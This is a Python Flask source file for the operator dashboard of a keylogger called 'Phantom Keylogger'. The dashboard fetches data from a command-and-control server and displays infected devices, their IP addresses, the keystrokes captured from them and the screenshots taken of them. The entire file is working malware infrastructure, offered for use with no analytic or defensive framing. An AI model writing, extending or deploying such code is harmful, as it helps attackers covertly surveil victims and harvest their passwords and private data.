from flask import Flask, render_template, jsonify, request, send_file
import requests
import json
from datetime import datetime
import os
from pathlib import Path
import threading
import webbrowser

class WebKeyloggerManager:
    def __init__(self, c2_url, web_port=5001):
        self.c2_url = c2_url.rstrip('/')
        self.web_port = web_port
        self.app = Flask(__name__)
        self.setup_routes()
        
    def setup_routes(self):
        self.app.route('/')(self.dashboard)
        self.app.route('/devices')(self.get_devices_api)
        self.app.route('/device/<device_id>')(self.get_device_data_api)
        self.app.route('/device/<device_id>/keystrokes')(self.get_device_keystrokes)
        self.app.route('/device/<device_id>/screenshots')(self.get_device_screenshots)
        self.app.route('/screenshot/<device_id>/<filename>')(self.view_screenshot)
        self.app.route('/update_name/<device_id>', methods=['POST'])(self.update_device_name)
        self.app.route('/delete_device/<device_id>', methods=['POST'])(self.delete_device)

    def dashboard(self):
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Phantom Keylogger - Control Panel</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                .online-dot { color: #10B981; }
                .offline-dot { color: #EF4444; }
                .fade-in { animation: fadeIn 0.5s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            </style>
        </head>
        <body class="bg-gray-900 text-white">
            <div class="container mx-auto px-4 py-8">
                <!-- Header -->
                <div class="text-center mb-8 fade-in">
                    <h1 class="text-4xl font-bold text-red-500 mb-2">
                        <i class="fas fa-ghost mr-3"></i>Phantom Keylogger
                    </h1>
                    <div class="flex justify-center space-x-4 mt-4">
                        <button onclick="loadDevices()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg transition">
                            <i class="fas fa-sync-alt mr-2"></i>Refresh
                        </button>
                        <button onclick="startAutoRefresh()" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg transition">
                            <i class="fas fa-play mr-2"></i>Auto-Refresh (30s)
                        </button>
                        <button onclick="stopAutoRefresh()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg transition">
                            <i class="fas fa-stop mr-2"></i>Stop Auto
                        </button>
                    </div>
                </div>

                <!-- Stats Overview -->
                <div id="stats" class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
                    <!-- Stats will be loaded by JavaScript -->
                </div>

                <!-- Devices Table -->
                <div class="bg-gray-800 rounded-lg shadow-lg overflow-hidden fade-in">
                    <div class="px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-semibold">
                            <i class="fas fa-laptop mr-2"></i>Connected Devices
                        </h2>
                    </div>
                    <div id="devices-container" class="p-4">
                        <div class="text-center py-8 text-gray-500">
                            <i class="fas fa-spinner fa-spin text-2xl mb-2"></i>
                            <p>Loading devices...</p>
                        </div>
                    </div>
                </div>

                <!-- Device Details Modal -->
                <div id="deviceModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
                    <div class="bg-gray-800 rounded-lg w-11/12 md:w-3/4 h-3/4 overflow-hidden">
                        <div class="flex justify-between items-center p-4 border-b border-gray-700">
                            <h3 id="modalTitle" class="text-xl font-semibold">Device Details</h3>
                            <button onclick="closeModal()" class="text-gray-400 hover:text-white">
                                <i class="fas fa-times text-2xl"></i>
                            </button>
                        </div>
                        <div id="modalContent" class="p-4 h-full overflow-y-auto">
                            <!-- Content loaded dynamically -->
                        </div>
                    </div>
                </div>
            </div>

            <script>
                let autoRefreshInterval = null;

                function loadDevices() {
                    fetch('/devices')
                        .then(response => response.json())
                        .then(data => {
                            updateStats(data);
                            renderDevicesTable(data);
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            document.getElementById('devices-container').innerHTML = 
                                '<div class="text-center py-8 text-red-400"><i class="fas fa-exclamation-triangle text-2xl mb-2"></i><p>Failed to load devices</p></div>';
                        });
                }

                function updateStats(devices) {
                    const online = devices.filter(d => d.active).length;
                    const totalKeystrokes = devices.reduce((sum, d) => sum + d.keystroke_count, 0);
                    const totalScreenshots = devices.reduce((sum, d) => sum + d.screenshot_count, 0);
                    
                    document.getElementById('stats').innerHTML = `
                        <div class="bg-gray-800 p-4 rounded-lg text-center">
                            <div class="text-2xl font-bold text-green-400">${online}</div>
                            <div class="text-gray-400">Online Devices</div>
                        </div>
                        <div class="bg-gray-800 p-4 rounded-lg text-center">
                            <div class="text-2xl font-bold text-blue-400">${devices.length}</div>
                            <div class="text-gray-400">Total Devices</div>
                        </div>
                        <div class="bg-gray-800 p-4 rounded-lg text-center">
                            <div class="text-2xl font-bold text-yellow-400">${totalKeystrokes}</div>
                            <div class="text-gray-400">Keystrokes Captured</div>
                        </div>
                        <div class="bg-gray-800 p-4 rounded-lg text-center">
                            <div class="text-2xl font-bold text-purple-400">${totalScreenshots}</div>
                            <div class="text-gray-400">Screenshots Taken</div>
                        </div>
                    `;
                }

                function renderDevicesTable(devices) {
                    if (devices.length === 0) {
                        document.getElementById('devices-container').innerHTML = 
                            '<div class="text-center py-8 text-gray-500"><i class="fas fa-laptop-slash text-2xl mb-2"></i><p>No devices connected</p></div>';
                        return;
                    }

                    const tableHTML = `
                        <div class="overflow-x-auto">
                            <table class="w-full">
                                <thead class="bg-gray-700">
                                    <tr>
                                        <th class="px-4 py-2 text-left">Status</th>
                                        <th class="px-4 py-2 text-left">Device Name</th>
                                        <th class="px-4 py-2 text-left">IP Address</th>
                                        <th class="px-4 py-2 text-left">First Seen</th>
                                        <th class="px-4 py-2 text-left">Last Seen</th>
                                        <th class="px-4 py-2 text-left">Keystrokes</th>
                                        <th class="px-4 py-2 text-left">Screenshots</th>
                                        <th class="px-4 py-2 text-left">Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    ${devices.map(device => `
                                        <tr class="border-b border-gray-700 hover:bg-gray-750 transition">
                                            <td class="px-4 py-3">
                                                <i class="fas fa-circle ${device.active ? 'online-dot' : 'offline-dot'}"></i>
                                            </td>
                                            <td class="px-4 py-3">
                                                <span class="device-name">${device.name}</span>
                                                <button onclick="editDeviceName('${device.id}')" class="ml-2 text-blue-400 hover:text-blue-300">
                                                    <i class="fas fa-edit text-sm"></i>
                                                </button>
                                            </td>
                                            <td class="px-4 py-3">${device.ip}</td>
                                            <td class="px-4 py-3">${new Date(device.first_seen).toLocaleString()}</td>
                                            <td class="px-4 py-3">${new Date(device.last_seen).toLocaleString()}</td>
                                            <td class="px-4 py-3">
                                                <span class="bg-blue-900 px-2 py-1 rounded-full text-sm">${device.keystroke_count}</span>
                                            </td>
                                            <td class="px-4 py-3">
                                                <span class="bg-purple-900 px-2 py-1 rounded-full text-sm">${device.screenshot_count}</span>
                                            </td>
                                            <td class="px-4 py-3">
                                                <div class="flex space-x-2">
                                                    <button onclick="viewKeystrokes('${device.id}')" 
                                                            class="bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded text-sm transition">
                                                        <i class="fas fa-keyboard mr-1"></i>Keys
                                                    </button>
                                                    <button onclick="viewScreenshots('${device.id}')" 
                                                            class="bg-purple-600 hover:bg-purple-700 px-3 py-1 rounded text-sm transition">
                                                        <i class="fas fa-camera mr-1"></i>Shots
                                                    </button>
                                                    <button onclick="deleteDevice('${device.id}')" 
                                                            class="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-sm transition">
                                                        <i class="fas fa-trash mr-1"></i>Remove
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                    `;
                    
                    document.getElementById('devices-container').innerHTML = tableHTML;
                }

                function viewKeystrokes(deviceId) {
                    fetch(`/device/${deviceId}/keystrokes`)
                        .then(response => response.json())
                        .then(data => {
                            const keystrokesHTML = data.keystrokes.map(k => 
                                `<div class="border-b border-gray-700 py-2">
                                    <div class="text-sm text-gray-400">${new Date(k.timestamp).toLocaleString()}</div>
                                    <div class="font-mono bg-gray-900 p-2 rounded mt-1 whitespace-pre-wrap">${k.data}</div>
                                </div>`
                            ).join('');
                            
                            document.getElementById('modalTitle').innerHTML = `Keystrokes - ${data.device.name}`;
                            document.getElementById('modalContent').innerHTML = `
                                <div class="mb-4">
                                    <h4 class="text-lg font-semibold mb-2">Recent Activity</h4>
                                    <div class="max-h-96 overflow-y-auto">
                                        ${keystrokesHTML.length ? keystrokesHTML : '<p class="text-gray-500">No keystrokes recorded</p>'}
                                    </div>
                                </div>
                            `;
                            document.getElementById('deviceModal').classList.remove('hidden');
                            document.getElementById('deviceModal').classList.add('flex');
                        });
                }

                function viewScreenshots(deviceId) {
                    fetch(`/device/${deviceId}/screenshots`)
                        .then(response => response.json())
                        .then(screenshots => {
                            const screenshotsHTML = screenshots.map((shot, index) => `
                                <div class="border border-gray-700 rounded-lg p-4">
                                    <div class="flex justify-between items-center mb-2">
                                        <span class="font-mono text-sm">${shot.filename}</span>
                                        <span class="text-gray-400 text-sm">${new Date(shot.modified).toLocaleString()}</span>
                                    </div>
                                    <img src="/screenshot/${deviceId}/${shot.filename}" 
                                         alt="Screenshot" 
                                         class="w-full h-48 object-cover rounded cursor-pointer hover:opacity-90 transition"
                                         onclick="openImage('/screenshot/${deviceId}/${shot.filename}')">
                                    <div class="mt-2 text-right">
                                        <span class="text-gray-400 text-sm">${(shot.size / 1024 / 1024).toFixed(2)} MB</span>
                                    </div>
                                </div>
                            `).join('');
                            
                            document.getElementById('modalTitle').innerHTML = `Screenshots`;
                            document.getElementById('modalContent').innerHTML = `
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    ${screenshotsHTML.length ? screenshotsHTML : '<p class="text-gray-500 col-span-2 text-center py-8">No screenshots available</p>'}
                                </div>
                            `;
                            document.getElementById('deviceModal').classList.remove('hidden');
                            document.getElementById('deviceModal').classList.add('flex');
                        });
                }

                function editDeviceName(deviceId) {
                    const currentName = document.querySelector(`tr button[onclick="editDeviceName('${deviceId}')"]`).closest('td').querySelector('.device-name').textContent;
                    const newName = prompt('Enter new device name:', currentName);
                    if (newName && newName !== currentName) {
                        fetch(`/update_name/${deviceId}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ name: newName })
                        }).then(() => loadDevices());
                    }
                }

                function deleteDevice(deviceId) {
                    if (confirm('Are you sure you want to remove this device from the dashboard?')) {
                        fetch(`/delete_device/${deviceId}`, { method: 'POST' })
                            .then(() => loadDevices());
                    }
                }

                function openImage(url) {
                    window.open(url, '_blank');
                }

                function closeModal() {
                    document.getElementById('deviceModal').classList.add('hidden');
                    document.getElementById('deviceModal').classList.remove('flex');
                }

                function startAutoRefresh() {
                    stopAutoRefresh();
                    autoRefreshInterval = setInterval(loadDevices, 30000);
                    alert('Auto-refresh started (30 second intervals)');
                }

                function stopAutoRefresh() {
                    if (autoRefreshInterval) {
                        clearInterval(autoRefreshInterval);
                        autoRefreshInterval = null;
                        alert('Auto-refresh stopped');
                    }
                }

                // Load devices on page load
                document.addEventListener('DOMContentLoaded', loadDevices);

                // Close modal on escape key
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'Escape') closeModal();
                });
            </script>
        </body>
        </html>
        """

    def get_devices_api(self):
        try:
            response = requests.get(f"{self.c2_url}/devices", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_data_api(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/device/{device_id}", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_keystrokes(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/device/{device_id}", timeout=10)
            data = response.json()
            return jsonify({
                "device": data["device"],
                "keystrokes": data["recent_keystrokes"][-50:]  # Last 50 entries
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_screenshots(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/screenshots/{device_id}", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def view_screenshot(self, device_id, filename):
        screenshot_path = Path("infected_devices") / device_id / "screenshots" / filename
        if screenshot_path.exists():
            return send_file(screenshot_path, mimetype='image/png')
        return "Screenshot not found", 404

    def update_device_name(self, device_id):
        try:
            new_name = request.json.get('name')
            response = requests.post(
                f"{self.c2_url}/update_device_name",
                json={"device_ip": device_id, "name": new_name},
                timeout=10
            )
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def delete_device(self, device_id):
        # This would remove from local database - implement as needed
        return jsonify({"status": "Device removal not implemented in basic version"})

    def run(self):
        print(f"🌐 Starting Web Management Interface...")
        print(f"📊 Dashboard available at: http://localhost:{self.web_port}")
        print(f"🔗 Connected to C2 Server: {self.c2_url}")
        print("\nPress Ctrl+C to stop the web interface")
        
        # Auto-open browser
        threading.Timer(2, lambda: webbrowser.open(f"http://localhost:{self.web_port}")).start()
        
        self.app.run(host='0.0.0.0', port=self.web_port, debug=False)

def main():
    # Read server URL
    try:
        with open("server_url.txt", "r") as f:
            server_url = f.read().strip()
    except FileNotFoundError:
        print("❌ server_url.txt not found. Run server.py first.")
        return
    
    # Start web interface
    manager = WebKeyloggerManager(server_url, web_port=5001)
    manager.run()

if __name__ == "__main__":
    main()